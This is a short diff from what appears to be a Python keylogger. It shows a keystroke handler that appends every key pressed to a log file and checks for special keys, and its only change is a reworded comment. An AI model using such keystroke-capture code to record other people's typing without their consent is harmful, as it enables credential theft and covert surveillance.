@@ -23,7 +23,7 @@ def OnKeyPress(event):
     with open(LOG_FILE, 'a') as f:
         f.write('{}\n'.format(event.Key))
     
-    # reduce load on CPU when hot key is pressed 
+    # reduce load on CPU when special key is pressed 
     if event.Key == 'Left' or event.Key == 'Right' or event.Key == 'Up' or event.Key == 'Tab'\
         or event.Key == 'Down' or event.Key == 'space' or event.Key == 'Shift_R' or event.Key == 'Return'\
             or event.Key == 'Shift_L' or event.Key == 'Super_L' or event.Key == 'Super_R'\
